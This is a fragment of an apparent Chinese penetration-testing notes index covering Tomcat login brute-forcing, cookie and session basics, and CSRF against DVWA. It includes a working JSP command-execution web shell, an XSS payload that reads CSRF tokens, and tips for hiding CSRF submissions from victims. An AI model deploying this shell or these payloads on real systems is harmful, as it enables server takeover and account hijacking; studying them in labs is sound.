attack"},{"location":"web/authentication_attack/#_1","text":"\u8eab\u4efd\u8ba4\u8bc1\u6280\u672f\u662f\u5728\u8ba1\u7b97\u673a\u7f51\u7edc\u4e2d\u786e\u8ba4\u64cd\u4f5c\u8005\u8eab\u4efd\u7684\u8fc7\u7a0b\u800c\u4ea7\u751f\u7684\u6709\u6548\u89e3\u51b3\u65b9\u6cd5\u3002 \u8ba1\u7b97\u673a\u7f51\u7edc\u4e16\u754c\u4e2d\u4e00\u5207\u4fe1\u606f\u5305\u62ec\u7528\u6237\u7684\u8eab\u4efd\u4fe1\u606f\u90fd\u662f\u7528\u4e00\u7ec4\u7279\u5b9a\u7684\u6570\u636e\u6765\u8868\u793a\u7684\uff0c\u8ba1\u7b97\u673a\u53ea\u80fd\u8bc6\u522b\u7528\u6237\u7684\u6570\u5b57\u8eab\u4efd\uff0c\u6240\u6709\u5bf9\u7528\u6237\u7684\u6388\u6743\u4e5f\u662f\u9488\u5bf9\u7528\u6237\u6570\u5b57\u8eab\u4efd\u7684\u6388\u6743\u3002 \u8eab\u4efd\u8ba4\u8bc1\u653b\u51fb\u5c31\u662f\u4e3a\u4e86\u4f7f\u7528\u5404\u79cd\u529e\u6cd5\u901a\u8fc7\u8fd9\u5c42\u8ba4\u8bc1\uff0c\u7a81\u7834\u4f5c\u4e3a\u9632\u62a4\u7f51\u7edc\u8d44\u4ea7\u7684\u7b2c\u4e00\u9053\u5173\u53e3\uff0c\u8eab\u4efd\u8ba4\u8bc1\u653b\u51fb\u5728\u6e17\u900f\u6d4b\u8bd5\u4e2d\u6709\u7740\u4e3e\u8db3\u8f7b\u91cd\u7684\u4f5c\u7528\u3002","title":"\u8eab\u4efd\u8ba4\u8bc1\u4ecb\u7ecd"},{"location":"web/authentication_attack/#web","text":"\u5e38\u89c1web\u767b\u9646\u53e3\u53ea\u6709\u7528\u6237\u540d\u8ddf\u5bc6\u7801, \u6ca1\u6709\u9a8c\u8bc1\u7801, \u53ef\u4ee5\u4f7f\u7528 BurpSuite \u7684 Intruder \u6a21\u5757\u8fdb\u884c\u66b4\u529b\u7834\u89e3\u3002","title":"Web\u8ba4\u8bc1\u653b\u51fb"},{"location":"web/authentication_attack/#basic","text":"","title":"Basic\u8ba4\u8bc1\u653b\u51fb"},{"location":"web/authentication_attack/#tomcat","text":"","title":"Tomcat \u66b4\u529b\u7834\u89e3"},{"location":"web/authentication_attack/#tomcat_1","text":"","title":"\u53d1\u73b0 Tomcat \u767b\u5f55\u754c\u9762"},{"location":"web/authentication_attack/#burpsuite","text":"\u53d1\u73b0\u4f7f\u7528 Basic \u8ba4\u8bc1\u52a0\u5bc6, \u89c2\u5bdf\u63a8\u6d4b\u53ef\u80fd\u662f Basic64 , \u89e3\u7801\u540e\u53d1\u73b0\u683c\u5f0f\u4e3a \u7528\u6237\u540d:\u5bc6\u7801","title":"Burpsuite \u6293\u5305"},{"location":"web/authentication_attack/#intruder","text":"\u4f7f\u7528\u81ea\u5b9a\u4e49\u8fed\u4ee3\u5668, \u4f4d\u7f6e1 \u4e3a\u7528\u6237\u540d, \u4f4d\u7f6e2 \u4e3a\u5bc6\u7801, \u5206\u5272\u7b26\u4e3a : , \u5e76\u4f7f\u7528 Base64 \u7f16\u7801\u8f6c\u5316 \u3002 \u53d1\u73b0\u8fd4\u56de\u6570\u636e\u8f83\u5927\u7684\u8bf7\u6c42, \u5bf9 Basic \u5b57\u6bb5\u8fdb\u884c Base64 \u89e3\u7801, \u5f97\u5230 tomcat:admin","title":"Intruder \u66b4\u529b\u7834\u89e3"},{"location":"web/authentication_attack/#_2","text":"\u5c1d\u8bd5\u4f7f\u7528 tomcat:admin \u767b\u5f55, \u8fdb\u5165\u540e\u53f0 \u3002","title":"\u767b\u5f55\u540e\u53f0"},{"location":"web/authentication_attack/#war","text":"\u65b0\u5efa shell.jsp \u6587\u4ef6\uff0c\u8f6c\u5316\u4e3a war \u6587\u4ef6\u3002 <% if ( \"x\" . equals ( request . getParameter ( \"pwd\" ))) { java . io . InputStream in = Runtime . getRuntime (). exec ( request . getParameter ( \"i\" )). getInputStream (); int a =- 1 ; byte [] b = new byte [ 2048 ] ; out . print ( \"<pre>\" ); while (( a = in . read ( b )) !=- 1 ) { out . println ( new String ( b )); } out . print ( \"</pre>\" ); } %> \u540e\u53f0\u9009\u62e9\u751f\u6210\u7684 war \u6587\u4ef6\uff0c\u7136\u540e Deploy\u3002","title":"\u4e0a\u4f20 war \u5305"},{"location":"web/authentication_attack/#_3","text":"MSF \u7684 auxiliary/scanner/http/tomcat_mgr_login \u6a21\u5757\u4e5f\u53ef\u4ee5\u5bf9 Tomcat \u540e\u53f0\u767b\u5f55\u8fdb\u884c\u66b4\u529b\u7834\u89e3","title":"\u4f20\u9012\u53c2\u6570\u6267\u884c\u547d\u4ee4"},{"location":"web/cookie_session/","text":"\u4f1a\u8bdd\u6280\u672f \u7531\u4e8eHTTP\u662f\u65e0\u72b6\u6001\u534f\u8bae\uff0c\u6240\u4ee5HTTP\u534f\u8bae\u65e0\u6cd5\u8bb0\u4f4f\u5ba2\u6237\u7aef\u4fe1\u606f\u3002Web\u5e94\u7528\u4e3a\u6267\u884c\u5404\u79cd\u6709\u7528\u7684\u529f\u80fd\uff0c\u5e94\u7528\u7a0b\u5e8f\u9700\u8981\u8ffd\u8e2a\u6bcf\u540d\u7528\u6237\u901a\u8fc7\u4e0d\u540c\u7684\u8bf7\u6c42\u4e0e\u5e94\u7528\u7a0b\u5e8f\u4ea4\u4e92\u7684\u72b6\u6001\u3002\u4f8b\u5982\uff0c\u4e00\u4e2a\u8d2d\u7269\u5e94\u7528\u7a0b\u5e8f\u5141\u8bb8\u7528\u6237\u6d4f\u89c8\u4ea7\u54c1\u76ee\u5f55\u3001\u5f80\u8d2d\u7269\u8f66\u5185\u6dfb\u52a0\u5546\u54c1\u3001\u67e5\u770b\u5e76\u66f4\u65b0\u8d2d\u7269\u8f66\u5185\u5bb9\u3001\u7ed3\u8d26\u5e76\u63d0\u4f9b\u4e2a\u4eba\u4e0e\u652f\u4ed8\u4fe1\u606f\u3002 \u4e3a\u5b9e\u73b0\u8fd9\u79cd\u529f\u80fd\uff0c\u670d\u52a1\u7aef\u751f\u6210\u4e00\u7ec4\u5728\u7528\u6237\u63d0\u4ea4\u5404\u79cd\u8bf7\u6c42\u8fc7\u7a0b\u4e2d\u4ee3\u8868\u72b6\u6001\u7684\u6570\u636e\uff0c\u8fd9\u4e9b\u6570\u636e\u901a\u5e38\u4fdd\u5b58\u5728\u4e00\u4e2a\u53eb\u4f1a\u8bdd\u7684\u670d\u52a1\u7aef\u7ed3\u6784\u4e2d\u3002\u4f1a\u8bdd\u5305\u542b\u4e86cookie\u548csession\u3002 Session \u7531\u4e8eHTTP\u534f\u8bae\u65e0\u72b6\u6001\uff0c\u670d\u52a1\u7aef\u65e0\u6cd5\u6cd5\u8bc6\u522b\u54ea\u4e2a\u7528\u6237\u64cd\u4f5c\u7684\uff0c\u6240\u4ee5\u670d\u52a1\u7aef\u8981\u4e3a\u7279\u5b9a\u7684\u7528\u6237\u521b\u5efa\u7279\u5b9a\u7684Session\uff0c\u7528\u4e8e\u6807\u8bc6\u8fd9\u4e2a\u7528\u6237\uff0c\u5e76\u8ddf\u8e2a\u7528\u6237\uff0c\u8fd9\u6837\u624d\u77e5\u9053\u8be5\u7528\u6237\u7684\u8d2d\u7269\u8f66\u91cc\u9762\u6709\u51e0\u672c\u4e66\u3002Session\u662f\u5b58\u5728\u670d\u52a1\u7aef\u7684\uff0c\u662f\u552f\u4e00\u6807\u8bc6\u3002 Cookie \u670d\u52a1\u7aef\u901a\u8fc7Cookie\u8bc6\u522b\u7279\u5b9a\u7684\u5ba2\u6237\uff0c\u6bcf\u6b21HTTP\u8bf7\u6c42\u65f6\uff0c\u5ba2\u6237\u7aef\u90fd\u4f1a\u53d1\u9001\u76f8\u5e94\u7684Cookie\u4fe1\u606f\u5230\u670d\u52a1\u7aef\u3002\u5b9e\u9645\u4e0a\u5927\u591a\u6570\u7684\u5e94\u7528\u90fd\u662f\u7528Cookie\u6765\u5b9e\u73b0Session\u8ddf\u8e2a\u7684\uff0c\u7b2c\u4e00\u6b21\u521b\u5efaSession\u7684\u65f6\u5019\uff0c\u670d\u52a1\u7aef\u4f1a\u5728HTTP\u534f\u8bae\u4e2d\u544a\u8bc9\u5ba2\u6237\u7aef\uff0c\u9700\u8981\u5728Cookie\u91cc\u9762\u8bb0\u5f55\u4e00\u4e2aSession ID\uff0c\u4ee5\u540e\u6bcf\u6b21\u8bf7\u6c42\u628a\u8fd9\u4e2a\u4f1a\u8bddID\u53d1\u9001\u5230\u670d\u52a1\u5668\uff0c\u670d\u52a1\u5668\u5373\u53ef\u8bc6\u522b\u3002 \u767b\u5f55\u6d41\u7a0b WEB\u5e94\u7528\u5224\u65ad\u7528\u6237\u662f\u5426\u767b\u5f55 \u5f53\u7528\u6237\u63d0\u4ea4\u7684\u5e10\u53f7\u5bc6\u7801\u6b63\u786e\u540e\uff0c\u670d\u52a1\u7aef\u4f1a\u4f7f\u7528SESSION\u5c06\u7528\u6237\u4fe1\u606f\u5b58\u50a8\u5230\u670d\u52a1\u7aef\u3002\u5e76\u5c06 SESSIONID \u4ee5 SETCOOKIE \u7684\u5f62\u5f0f\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef\u3002 \u5f53\u7528\u6237\u7b2c\u4e8c\u6b21\u8bbf\u95ee\u7ad9\u70b9\u65f6\uff0c\u4f1a\u81ea\u52a8\u5e26\u4e0aCOOKIE\u4fe1\u606f\uff0c\u90a3\u4e48\u670d\u52a1\u7aef\u4f1a\u6839\u636eCOOKIE\u4e2d\u7684SESSIONID\u8fdb\u884c\u5339\u914d\u6570\u636e\u3002 \u5982\u679c\u5b58\u5728\u6570\u636e\uff0c\u5219\u8bf4\u660e\u5df2\u7ecf\u767b\u5f55\u8fc7\uff0c\u4e3a\u767b\u5f55\u72b6\u6001\u3002 \u5982\u679c\u4e0d\u5b58\u5728\u6570\u636e\uff0c\u5219\u8bf4\u660e\u6ca1\u6709\u767b\u5f55\uff0c\u4e3a\u672a\u767b\u5f55\u72b6\u6001\u3002","title":"Cookie session"},{"location":"web/cookie_session/#_1","text":"\u7531\u4e8eHTTP\u662f\u65e0\u72b6\u6001\u534f\u8bae\uff0c\u6240\u4ee5HTTP\u534f\u8bae\u65e0\u6cd5\u8bb0\u4f4f\u5ba2\u6237\u7aef\u4fe1\u606f\u3002Web\u5e94\u7528\u4e3a\u6267\u884c\u5404\u79cd\u6709\u7528\u7684\u529f\u80fd\uff0c\u5e94\u7528\u7a0b\u5e8f\u9700\u8981\u8ffd\u8e2a\u6bcf\u540d\u7528\u6237\u901a\u8fc7\u4e0d\u540c\u7684\u8bf7\u6c42\u4e0e\u5e94\u7528\u7a0b\u5e8f\u4ea4\u4e92\u7684\u72b6\u6001\u3002\u4f8b\u5982\uff0c\u4e00\u4e2a\u8d2d\u7269\u5e94\u7528\u7a0b\u5e8f\u5141\u8bb8\u7528\u6237\u6d4f\u89c8\u4ea7\u54c1\u76ee\u5f55\u3001\u5f80\u8d2d\u7269\u8f66\u5185\u6dfb\u52a0\u5546\u54c1\u3001\u67e5\u770b\u5e76\u66f4\u65b0\u8d2d\u7269\u8f66\u5185\u5bb9\u3001\u7ed3\u8d26\u5e76\u63d0\u4f9b\u4e2a\u4eba\u4e0e\u652f\u4ed8\u4fe1\u606f\u3002 \u4e3a\u5b9e\u73b0\u8fd9\u79cd\u529f\u80fd\uff0c\u670d\u52a1\u7aef\u751f\u6210\u4e00\u7ec4\u5728\u7528\u6237\u63d0\u4ea4\u5404\u79cd\u8bf7\u6c42\u8fc7\u7a0b\u4e2d\u4ee3\u8868\u72b6\u6001\u7684\u6570\u636e\uff0c\u8fd9\u4e9b\u6570\u636e\u901a\u5e38\u4fdd\u5b58\u5728\u4e00\u4e2a\u53eb\u4f1a\u8bdd\u7684\u670d\u52a1\u7aef\u7ed3\u6784\u4e2d\u3002\u4f1a\u8bdd\u5305\u542b\u4e86cookie\u548csession\u3002","title":"\u4f1a\u8bdd\u6280\u672f"},{"location":"web/cookie_session/#session","text":"\u7531\u4e8eHTTP\u534f\u8bae\u65e0\u72b6\u6001\uff0c\u670d\u52a1\u7aef\u65e0\u6cd5\u6cd5\u8bc6\u522b\u54ea\u4e2a\u7528\u6237\u64cd\u4f5c\u7684\uff0c\u6240\u4ee5\u670d\u52a1\u7aef\u8981\u4e3a\u7279\u5b9a\u7684\u7528\u6237\u521b\u5efa\u7279\u5b9a\u7684Session\uff0c\u7528\u4e8e\u6807\u8bc6\u8fd9\u4e2a\u7528\u6237\uff0c\u5e76\u8ddf\u8e2a\u7528\u6237\uff0c\u8fd9\u6837\u624d\u77e5\u9053\u8be5\u7528\u6237\u7684\u8d2d\u7269\u8f66\u91cc\u9762\u6709\u51e0\u672c\u4e66\u3002Session\u662f\u5b58\u5728\u670d\u52a1\u7aef\u7684\uff0c\u662f\u552f\u4e00\u6807\u8bc6\u3002","title":"Session"},{"location":"web/cookie_session/#cookie","text":"\u670d\u52a1\u7aef\u901a\u8fc7Cookie\u8bc6\u522b\u7279\u5b9a\u7684\u5ba2\u6237\uff0c\u6bcf\u6b21HTTP\u8bf7\u6c42\u65f6\uff0c\u5ba2\u6237\u7aef\u90fd\u4f1a\u53d1\u9001\u76f8\u5e94\u7684Cookie\u4fe1\u606f\u5230\u670d\u52a1\u7aef\u3002\u5b9e\u9645\u4e0a\u5927\u591a\u6570\u7684\u5e94\u7528\u90fd\u662f\u7528Cookie\u6765\u5b9e\u73b0Session\u8ddf\u8e2a\u7684\uff0c\u7b2c\u4e00\u6b21\u521b\u5efaSession\u7684\u65f6\u5019\uff0c\u670d\u52a1\u7aef\u4f1a\u5728HTTP\u534f\u8bae\u4e2d\u544a\u8bc9\u5ba2\u6237\u7aef\uff0c\u9700\u8981\u5728Cookie\u91cc\u9762\u8bb0\u5f55\u4e00\u4e2aSession ID\uff0c\u4ee5\u540e\u6bcf\u6b21\u8bf7\u6c42\u628a\u8fd9\u4e2a\u4f1a\u8bddID\u53d1\u9001\u5230\u670d\u52a1\u5668\uff0c\u670d\u52a1\u5668\u5373\u53ef\u8bc6\u522b\u3002","title":"Cookie"},{"location":"web/cookie_session/#_2","text":"WEB\u5e94\u7528\u5224\u65ad\u7528\u6237\u662f\u5426\u767b\u5f55 \u5f53\u7528\u6237\u63d0\u4ea4\u7684\u5e10\u53f7\u5bc6\u7801\u6b63\u786e\u540e\uff0c\u670d\u52a1\u7aef\u4f1a\u4f7f\u7528SESSION\u5c06\u7528\u6237\u4fe1\u606f\u5b58\u50a8\u5230\u670d\u52a1\u7aef\u3002\u5e76\u5c06 SESSIONID \u4ee5 SETCOOKIE \u7684\u5f62\u5f0f\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef\u3002 \u5f53\u7528\u6237\u7b2c\u4e8c\u6b21\u8bbf\u95ee\u7ad9\u70b9\u65f6\uff0c\u4f1a\u81ea\u52a8\u5e26\u4e0aCOOKIE\u4fe1\u606f\uff0c\u90a3\u4e48\u670d\u52a1\u7aef\u4f1a\u6839\u636eCOOKIE\u4e2d\u7684SESSIONID\u8fdb\u884c\u5339\u914d\u6570\u636e\u3002 \u5982\u679c\u5b58\u5728\u6570\u636e\uff0c\u5219\u8bf4\u660e\u5df2\u7ecf\u767b\u5f55\u8fc7\uff0c\u4e3a\u767b\u5f55\u72b6\u6001\u3002 \u5982\u679c\u4e0d\u5b58\u5728\u6570\u636e\uff0c\u5219\u8bf4\u660e\u6ca1\u6709\u767b\u5f55\uff0c\u4e3a\u672a\u767b\u5f55\u72b6\u6001\u3002","title":"\u767b\u5f55\u6d41\u7a0b"},{"location":"web/csrf/","text":"CSRF CSRF \u6f0f\u6d1e\u539f\u7406 CSRF(CrossSiteRequestForgery), \u4e2d\u6587\u662f\u8de8\u7ad9\u70b9\u8bf7\u6c42\u4f2a\u9020. CSRF\u653b\u51fb\u8005\u5728\u7528\u6237\u5df2\u7ecf\u767b\u5f55\u76ee\u6807\u7f51\u7ad9\u4e4b\u540e, \u8bf1\u4f7f\u7528\u6237\u8bbf\u95ee\u4e00\u4e2a\u653b\u51fb\u9875\u9762, \u5229\u7528\u76ee\u6807\u7f51\u7ad9\u5bf9\u7528\u6237\u7684\u4fe1\u4efb, \u4ee5\u7528\u6237\u8eab\u4efd\u5728\u653b\u51fb\u9875\u9762\u5bf9\u76ee\u6807\u7f51\u7ad9\u53d1\u8d77\u4f2a\u9020\u7528\u6237\u64cd\u4f5c\u7684\u8bf7\u6c42, \u6bd4\u5982\u4ee5\u4f60\u7684\u540d\u4e49\u53d1\u9001\u90ae\u4ef6, \u53d1\u6d88\u606f, \u76d7\u53d6\u4f60\u7684\u8d26\u53f7, \u6dfb\u52a0\u7cfb\u7edf\u7ba1\u7406\u5458, \u751a\u81f3\u4e8e\u8d2d\u4e70\u5546\u54c1, \u865a\u62df\u8d27\u5e01\u8f6c\u8d26\u7b49, \u8fbe\u5230\u653b\u51fb\u76ee\u7684. CSRF \u548c XSS \u6700\u5927\u7684\u533a\u522b\u5c31\u5728\u4e8e, CSRF \u5e76\u6ca1\u6709\u76d7\u53d6 cookie \u800c\u662f\u76f4\u63a5\u5229\u7528. XSS \u53ef\u4ee5\u901a\u8fc7 document.cookies \u83b7\u53d6 cookie . \u6f0f\u6d1e\u573a\u666f \u7528\u6237\u6253\u5f00\u6d4f\u89c8\u5668, \u8bbf\u95ee\u53d7\u4fe1\u4efb\u7684\u7f51\u7ad9, \u4f46\u662f\u8be5\u7f51\u7ad9\u5b58\u5728 CSRF \u6f0f\u6d1e, \u7528\u6237\u8f93\u5165\u8d26\u53f7\u5bc6\u7801\u6b63\u5e38\u767b\u5f55 \u5728\u7528\u6237\u4fe1\u606f\u901a\u8fc7\u9a8c\u8bc1\u540e, \u8be5\u7f51\u7ad9\u4ea7\u751f\u4e86cookie\u4fe1\u606f\u5e76\u8fd4\u56de\u7ed9\u6d4f\u89c8\u5668, \u7528\u6237\u767b\u5f55\u6210\u529f, \u53ef\u4ee5\u6b63\u5e38\u64cd\u4f5c \u7528\u6237\u4e3a\u9000\u51fa\u767b\u5f55\u7684\u60c5\u51b5\u4e0b, \u5728\u540c\u4e00\u6d4f\u89c8\u5668\u4e2d, \u6253\u5f00\u65b0\u7684 Tab \u8bbf\u95ee\u4e86\u67d0\u4e2a\u6076\u610f\u7f51\u7ad9 \u6076\u610f\u7f51\u7ad9\u4f1a\u8fd4\u56de\u4e00\u4e9b\u6709\u653b\u51fb\u6027\u7684\u4ee3\u7801, \u5728\u7528\u6237\u4e0d\u77e5\u60c5\u7684\u60c5\u51b5\u4e0b\u5229\u7528\u7528\u6237\u7684 cookie \u4fe1\u606f\u5bf9\u539f\u7f51\u7ad9\u6267\u884c\u67d0\u4e9b\u64cd\u4f5c CSRF \u6f0f\u6d1e\u6316\u6398 CSRF \u6f0f\u6d1e\u6316\u6398\u601d\u8def \u9ed1\u76d2\u6316\u6398 \u6d4b\u8bd5\u4e00\u4e9b\u654f\u611f\u529f\u80fd\u70b9, \u7279\u522b\u5173\u6ce8\u540e\u53f0\u9ad8\u5371\u529f\u80fd\u70b9, \u6293\u5305\u770b\u662f\u5426\u542b\u6709token\u53c2\u6570, \u5982\u679c\u6ca1\u6709, \u518d\u76f4\u63a5 \u8bf7\u6c42\u8fd9\u4e2a\u9875\u9762, \u4e0d\u5e26 referer, \u5982\u679c\u8fd4\u56de\u6570\u636e\u8fd8\u662f\u4e00\u6837\u7684, \u90a3\u8bf4\u660e\u5f88\u6709\u53ef\u80fd\u5b58\u5728 CSRF \u6f0f\u6d1e . \u767d\u76d2\u6316\u6398 \u8bfb\u53d6\u4ee3\u7801\u7684\u6838\u5fc3\u6587\u4ef6, \u67e5\u770b\u91cc\u8fb9\u6709\u6ca1\u6709\u9a8c\u8bc1 token \u548c referer \u76f8\u5173\u7684\u4ee3\u7801 . \u6216\u8005\u76f4\u63a5\u641c\u7d22 token \u8fd9\u4e2a \u5173\u952e\u5b57 , \u518d\u53bb\u770b\u4e00\u4e0b\u6bd4\u8f83\u5173\u5fc3\u7684\u529f\u80fd\u70b9\u7684\u4ee3\u7801\u6709\u6ca1\u6709\u9a8c\u8bc1 . DESTOON \u4ece CSRF \u5230 GETSHELL: https://bbs.ichunqiu.com/thread-27413-1-1.html GET \u578b CSRF \u4fee\u6539 DVWA \u5b89\u5168\u7b49\u7ea7\u4e3a Low, \u7136\u540e\u5230 CSRF \u6d4b\u8bd5\u73af\u5883, \u7528\u6237\u4fee\u6539\u5bc6\u7801\u9700\u8981\u8fde\u7eed\u8f93\u5165\u4e24\u6b21\u65b0\u5bc6\u7801, \u5728\u63d0\u4ea4\u7684\u7684\u65f6\u5019\u901a\u8fc7 BurpSuite \u6293\u53d6\u6570\u636e\u5305, low \u7ea7\u522b\u7684 csrf \u73af\u5883\u4ec5\u901a\u8fc7 GET \u65b9\u6cd5\u8fdb\u884c\u5bc6\u7801\u4fee\u6539, \u6ca1\u6709\u4efb\u4f55\u6821\u9a8c, \u6240\u4ee5\u901a\u8fc7\u4f2a\u9020\u7b26\u5408\u8981\u6c42\u7684 URL, \u8bf1\u4f7f\u7528\u6237\u8fdb\u884c\u70b9\u51fb\u5c31\u53ef\u4ee5\u505a\u5230\u4efb\u610f\u5bc6\u7801\u7684\u4fee\u6539. \u4f7f\u7528 BurpSuite \u7684 PoC \u751f\u6210\u5de5\u5177\u53ef\u4ee5\u5feb\u901f\u751f\u6210\u6d4b\u8bd5\u9875\u9762 . \u4e3a\u4e86\u8ba9\u53d7\u5bb3\u8005\u65e0\u6cd5\u5bdf\u89c9\u5230\u653b\u51fb\u6216\u51cf\u5c11\u5bf9\u653b\u51fb\u7684\u6000\u7591, \u53ef\u4ee5\u5bf9 PoC \u8fdb\u884c\u6539\u9020 . \u5220\u9664 <input type=\"submit\" value=\"Submit request\" /> \u540e\u9875\u9762\u65e0\u63d0\u4ea4\u6309\u94ae \u6dfb\u52a0 <script>document.forms[0].submit(); \u81ea\u52a8\u63d0\u4ea4\u8bf7\u6c42, \u8bbf\u95ee\u9875\u9762\u76f4\u63a5\u53d1\u9001\u8bf7\u6c42 \u8bf1\u5bfc\u7528\u6237\u70b9\u51fb\u4f2a\u9020\u7684\u94fe\u63a5\u540e\u5bc6\u7801\u88ab\u4fee\u6539 \u7a81\u7834 Referer \u7684\u68c0\u6d4b \u4fee\u6539 DVWA \u7684\u5b89\u5168\u7b49\u7ea7\u4e3a Medium, \u6b64\u65f6 CSRF \u73af\u5883\u6dfb\u52a0\u4e86\u5bf9 Referer \u5b57\u6bb5\u7684\u5224\u65ad, \u901a\u8fc7\u4e0a\u9762\u7684\u65b9\u6cd5\u4f7f\u7528 BurpSuite \u751f\u6210\u7684 CSRF HTML \u65e0\u6cd5\u4fee\u6539\u5bc6\u7801. Referer \u5c5e\u6027\u8fd4\u56de\u8f7d\u5165\u5f53\u524d\u6587\u6863\u7684\u6765\u6e90\u6587\u6863\u7684 URL, \u5982\u679c\u5f53\u524d\u6587\u6863\u4e0d\u662f\u901a\u8fc7\u8d85\u7ea7\u94fe\u63a5\u8bbf\u95ee\u7684, \u5219\u4e3a null, \u6b64\u5c5e\u6027\u5141\u8bb8\u5ba2\u6237\u7aef JavaScript \u8bbf\u95ee HTTP \u5f15\u7528\u5934\u90e8. \u7531\u4e8e Referer \u5b57\u6bb5\u53ef\u4ee5\u901a\u8fc7\u5ba2\u6237\u7aef\u8fdb\u884c\u63a7\u5236, \u662f\u4e0d\u53ef\u4fe1\u7684\u5b57\u6bb5, \u6240\u4ee5\u5728 BurpSuite \u4e2d\u901a\u8fc7 Repeater \u53d1\u9001\u5e26\u6709 Referer \u7684\u8bf7\u6c42\u6216\u4f7f\u7528 HackBar \u4e3a\u6d4f\u89c8\u5668\u8bf7\u6c42\u6dfb\u52a0 Referer \u5b57\u6bb5\u53ef\u4ee5\u7ed5\u8fc7, \u5c1d\u8bd5\u5728 BurpSuite \u751f\u6210\u7684 CSRF HTML \u4e2d\u4f7f\u7528 JS \u4fee\u6539 Referer, \u4f46\u672a\u80fd\u6210\u529f ... \u7a81\u7834 Token \u68c0\u6d4b \u4fee\u6539 DVWA \u7684\u5b89\u5168\u7b49\u7ea7\u4e3a high, \u53d1\u73b0\u8bf7\u6c42\u4e2d\u591a\u4e86 user_token . \u6b64\u65f6\u53d1\u9001\u4fee\u6539\u5bc6\u7801\u7684\u8bf7\u6c42\u4f1a\u63d0\u793a CSRF token \u4e0d\u6b63\u786e, token \u5728\u8ba1\u7b97\u673a\u8eab\u4efd\u8ba4\u8bc1\u4e2d\u8868\u793a\u4e34\u65f6\u4ee4\u724c, \u6bcf\u6b21\u4fee\u6539\u5bc6\u7801\u90fd\u4f1a\u91cd\u7f6e token, \u6bcf\u6b21\u4fee\u6539\u5bc6\u7801\u90fd\u4f1a\u4f7f\u7528\u65b0\u7684 token, \u6240\u4ee5\u8fdb\u884c CSRF \u653b\u51fb\u5fc5\u987b\u83b7\u53d6\u5230\u6709\u6548\u7684 token \u624d\u53ef\u4ee5 . \u5728 DVWA \u4e2d\u53ef\u4ee5\u7ed3\u5408\u53cd\u5c04\u578b XSS \u6f0f\u6d1e\u83b7\u53d6 CSRF \u9875\u9762\u7684 token . < iframe src = \"../csrf\" onload = alert(frames[0].document.getElementsByName('user_token')[0].value) > \u4f7f\u7528 XSS \u83b7\u5f97\u7684 token, \u914d\u5408 Burpsuite \u751f\u6210\u7684 CSRF HTML, \u53ef\u4ee5\u6210\u529f\u4fee\u6539\u5bc6\u7801 . POST \u578b CSRF \u4f7f\u7528 POST \u65b9\u5f0f\u7684\u8bf7\u6c42, \u65e0\u6cd5\u76f4\u63a5\u901a\u8fc7 URL \u8bbf\u95ee\u7684\u65b9\u5f0f\u89e6\u53d1 CSRF, \u9700\u8981\u653b\u51fb\u8005\u6784\u9020 POC, \u5229\u7528\u5176\u4ed6\u65b9\u5f0f\u89e6\u53d1\u6f0f\u6d1e . \u5728 BurpSuite \u4e2d\u53f3\u952e Engagement tools --> Generate CSRF PoC \u5feb\u901f\u751f\u6210 CSRF HTML \u9875\u9762 . CSRF \u6f0f\u6d1e\u5229\u7528 XSS + CSRF \u7ec4\u5408 XSRF \u901a\u8fc7\u4fe1\u606f\u68c0\u7d22\u53d1\u73b0\u7f51\u7ad9\u7684 CMS \u76f8\u5173\u4fe1\u606f \u901a\u8fc7 CMS \u4fe1\u606f\u641c\u7d22\u5386\u53f2\u6f0f\u6d1e, \u53d1\u73b0\u8bba\u575b\u7559\u8a00\u677f\u5b58\u5728 XSS \u6f0f\u6d1e, \u540e\u53f0\u7528\u6237\u4fee\u6539\u5bc6\u7801\u5b58\u5728 CSRF \u6f0f\u6d1e \u63d2\u5165 XSS \u6f0f\u6d1e Payload, \u76ee\u7684\u4e3a\u89e6\u53d1 CSRF \u6f0f\u6d1e\u4fee\u6539\u7528\u6237\u5bc6\u7801 \u7f51\u7ad9\u7528\u6237\u767b\u5f55\u540e\u67e5\u770b\u7559\u8a00\u89e6\u53d1\u6f0f\u6d1e \u4fee\u6539 DVWA \u5b89\u5168\u7b49\u7ea7\u4e3a Low, \u7136\u540e\u6293\u53d6 CSRF \u4fee\u6539\u5bc6\u7801\u7684\u8bf7\u6c42, \u5728\u5b58\u50a8\u578b XSS \u7684 message \u4e2d\u63d2\u5165 img \u6807\u7b7e, \u5f53\u67e5\u770b\u8fd9\u6761\u4fe1\u606f\u65f6\u5c31\u4f1a\u89e6\u53d1 CSRF, \u5728\u7528\u6237\u672a\u5bdf\u89c9\u7684\u60c5\u51b5\u4e0b\u4fee\u6539\u5bc6\u7801 . //DVWA \u9650\u5236\u53ea\u80fd\u8f93\u5165 50 \u4e2a\u5b57\u7b26, F12 \u63a7\u5236\u53f0\u7f16\u8f91 maxlength \u7684\u503c\u53ef\u89e3\u9664\u8be5\u9650\u5236 < textarea name = \"mtxMessage\" cols = \"50\" rows = \"3\" maxlength = \"50\" ></ textarea > CSRF \u6f0f\u6d1e\u5371\u5bb3 \u9020\u6210\u7684\u95ee\u9898\u53ef\u80fd\u5305\u62ec: \u4e2a\u4eba\u9690\u79c1\u6cc4\u9732, \u673a\u5bc6\u8d44\u6599\u6cc4\u9732, \u7528\u6237\u751a\u81f3\u4f01\u4e1a\u7684\u8d22\u4ea7\u5b89\u5168 \u4ee5\u53d7\u5bb3\u8005\u540d\u4e49\u53d1\u90ae\u4ef6, \u53d1\u6d88\u606f . \u76d7\u53d6\u53d7\u5bb3\u8005\u7684\u8d26\u53f7, \u751a\u81f3\u8d2d\u4e70\u5546\u54c1, \u865a\u62df\u8d27\u5e01\u8f6c\u8d26 . \u4fee\u6539\u53d7\u5bb3\u8005\u7684\u7f51\u7edc\u914d\u7f6e(\u6bd4\u5982\u4fee\u6539\u8def\u7531\u5668DNS\u3001\u91cd\u7f6e\u8def\u7531\u5668\u5bc6\u7801) . \u7f51\u7ad9\u540e\u53f0\u521b\u5efa\u7ba1\u7406\u5458\u7528\u6237, \u7834\u574f\u7f51\u7ad9, \u83b7\u53d6\u670d\u52a1\u5668\u6743\u9650\u7b49 . CSRF \u6f0f\u6d1e\u9632\u62a4 CSRF \u5e38\u89c4\u9632\u5fa1\u65b9\u5f0f \u9a8c\u8bc1\u8bf7\u6c42\u5934\u4e2d\u7684 HTTP Referer \u5b57\u6bb5 \u5728\u8bf7\u6c42\u5305\u4e2d\u6dfb\u52a0 token \u5e76\u9a8c\u8bc1 \u5728 HTTP \u5934\u4e2d\u81ea\u5b9a\u4e49\u5c5e\u6027\u5e76\u9a8c\u8bc1 